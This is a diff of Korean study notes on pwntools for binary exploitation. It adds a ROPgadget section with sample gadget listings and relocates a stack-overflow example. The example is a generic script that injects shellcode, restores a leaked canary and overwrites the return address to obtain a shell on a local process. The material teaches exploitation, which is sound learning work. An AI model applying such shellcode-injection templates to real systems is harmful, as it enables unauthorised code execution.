@@ -75,8 +75,26 @@ $ python3 -m pip install --upgrade pwntools
    - `disasm(BIN)` 형태로 BIN에 바이너리 데이터를 입력시 어셈블리 명령어를 반환한다. 
    - ex) `disasm(b'\xb8\x0b\x00\x00\x00')` => `0:   b8 0b 00 00 00          mov    eax, 0xb'`
 
-## checksec
+
+### 예시
+1. stack frame안의 버퍼와 canary를 획득한 경우, 버퍼에 shell 실행 코드를 주입하고 stack overflow로 return code를 버퍼의 주소로 변경한 후 canary를 복원시키면 쉘을 획득할 수 있다.
+
+   ```
+   from pwn import *
+   target = process(TARGET_PROGRAM)
+   # 'canary' 는 추출해온 스택 카나리 값이 littel endian형태로 담겨있다.
+   shell_code = asm(shellcraft.sh())  # pwn tool로 쉘 실행코드 생성 및 바이너리로 변환
+   payload = shell_code.ljust(buffer_to_canary, b'A') + canary + b'B' * 0x8 + p64(buffer_address) # 버퍼에 쉘 코드를 넣고, 남는 칸은 아무 문자로 메꾼다. 그 후 카나리를 잘 복원하고 SFP는 아무 숫자나 채워넣고 리턴 주소를 버퍼 주소로 덮어씀
+   # gets() receives input until '\n' is received
+   target.sendlineafter(b'Input:', payload) # 타겟 프로그램에서 Input을 받아 'buffer_address' 주소에 받도록 프로그램이 짜여져 있다.
+
+   target.interactive() # 쉘을 획득하고 쉘을 유저가 활용할 수 있게 반환한다.
+   ```
+
+## 기타 도구
+### checksec
 - pwntool과 함께 설치되는 도구로, 바이너리에 적용되는 보호 기법(ex: RELRO, Canary, NX, PIE) 을 확인할 수 있다.
+  - ASLR은 리눅스에서 기본적으로 적용되어있으므로, 특별한 언급이 없다면 default on이라 생각하면 된다.
 - ex)
    ```
     Arch:     amd64-64-little
@@ -88,7 +106,7 @@ $ python3 -m pip install --upgrade pwntools
    ```
 
 
-## shellcraft
+### shellcraft
 - pwntool과 함께 설치되는 파이썬 모듈로 쉘 코드의 함수들을 반환한다.
   - shellcraft.sh() : 쉘 실행 코드
   - shellcraft.open() : 쉘 코드 open(인자 필요)
@@ -123,18 +141,44 @@ $ python3 -m pip install --upgrade pwntools
       ```
   - ex) asm(shellcraft.sh()) : `b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'`
 
-
-## 예시
-1. stack frame안의 버퍼와 canary를 획득한 경우, 버퍼에 shell 실행 코드를 주입하고 stack overflow로 return code를 버퍼의 주소로 변경한 후 canary를 복원시키면 쉘을 획득할 수 있다.
-
+### ROPgadget
+- 바이너리에서 gadget 값들을 확인할 수 있는 툴이다.
+- gadget들의 주소를 확인하여 exploit에 활용할 수 있다.
+- `ROPgadget --binary FILE_NAME` 을 입력하면 FILE_NAME 에서 gadget들을 찾아 출력 해 준다.
+  - ex) ROPgadget --binary /bin/bash 의 일부이다.
    ```
-   from pwn import *
-   target = process(TARGET_PROGRAM)
-   # 'canary' 는 추출해온 스택 카나리 값이 littel endian형태로 담겨있다.
-   shell_code = asm(shellcraft.sh())  # pwn tool로 쉘 실행코드 생성 및 바이너리로 변환
-   payload = shell_code.ljust(buffer_to_canary, b'A') + canary + b'B' * 0x8 + p64(buffer_address) # 버퍼에 쉘 코드를 넣고, 남는 칸은 아무 문자로 메꾼다. 그 후 카나리를 잘 복원하고 SFP는 아무 숫자나 채워넣고 리턴 주소를 버퍼 주소로 덮어씀
-   # gets() receives input until '\n' is received
-   target.sendlineafter(b'Input:', payload) # 타겟 프로그램에서 Input을 받아 'buffer_address' 주소에 받도록 프로그램이 짜여져 있다.
-
-   target.interactive() # 쉘을 획득하고 쉘을 유저가 활용할 수 있게 반환한다.
+   0x000000000008b4fb : xor r9d, r9d ; jmp 0x8b46b
+   0x00000000000c0e30 : xor r9d, r9d ; jmp 0xc0c50
+   0x00000000000c7caa : xor r9d, r9d ; jmp 0xc7cb3
+   0x00000000000cc0ed : xor r9d, r9d ; jmp 0xcb089
+   0x000000000007f2a5 : xor r9d, r9d ; lea eax, [rdx + 1] ; jmp 0x7ef68
+   0x000000000006dc63 : xor r9d, r9d ; mov dword ptr [rbx], eax ; jmp 0x6cfd8
+   0x00000000000618ec : xor r9d, r9d ; movsxd rax, r14d ; jmp 0x61792
+   0x000000000006d9b4 : xor r9d, r9d ; xor r13d, r13d ; mov dword ptr [rbx], eax ; jmp 0x6cfd8
+   0x00000000000757b3 : xor rax, qword ptr [r8] ; add byte ptr [rdi + 2], bh ; jmp 0x78b80
+   0x00000000000558c2 : xor rax, rax ; test r13, r13 ; jne 0x558e4 ; jmp 0x558f1
    ```
+- `--re REGULAR_EXPRESSION` 옵션을 넣어 정규 표현식으로 결과를 필터링 할 수 있다. (|grep 한 것과 유사한 효과)
+  - ex) ROPgadget --binary /bin/bash --re "pop rdi" 의 결과 일부
+      ```
+      0x00000000000c5ac8 : pop rdi ; jmp rax
+      0x00000000000b9c04 : pop rdi ; jne 0xb9c42 ; jmp 0xb9ce1
+      0x00000000000bfc3a : pop rdi ; jne 0xbf8c3 ; jmp 0xbf8cb
+      0x000000000005ca25 : pop rdi ; jns 0x5ca34 ; add al, ch ; jb 0x5c9f0 ; add dword ptr [rax], eax ; jmp 0x5c77f
+      0x000000000005cadd : pop rdi ; or al, 0 ; mov rdx, qword ptr [rax + rcx] ; jmp 0x5c6c0
+      0x000000000005cffc : pop rdi ; or al, 0 ; xor ebx, ebx ; xor ebp, ebp ; jmp 0x5d014
+      0x000000000007542d : pop rdi ; out dx, eax ; or al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x752f8
+      0x00000000000a69fc : pop rdi ; pop r8 ; jmp 0xa5ca0
+      0x00000000000665ca : pop rdi ; pop rbp ; ret
+      0x0000000000030934 : pop rdi ; ret
+      0x00000000000aca60 : pop rdi ; sete dl ; or eax, edx ; movzx ebp, al ; jmp 0xac482
+      0x00000000000ba113 : pop rdi ; sete sil ; or edx, esi ; jmp 0xb9eda
+      0x00000000000b5690 : pop rdi ; xor ecx, ecx ; jmp 0xb56be
+      0x00000000000493b2 : pop rsi ; pop rdi ; jmp 0x48b7d
+      0x00000000000a6ca9 : pop rsi ; pop rdi ; jmp 0xa5ca0
+      0x0000000000070836 : push rsi ; pop rdi ; add al, 0 ; jmp 0x705f1
+      0x0000000000073205 : shr al, 5 ; pop rdi ; add dword ptr [rax], eax ; mov r13, rax ; jmp 0x72db8
+      0x00000000000707e1 : stosd dword ptr [rdi], eax ; pop rdi ; add al, 0 ; jmp 0x7043d
+      ```
+
+
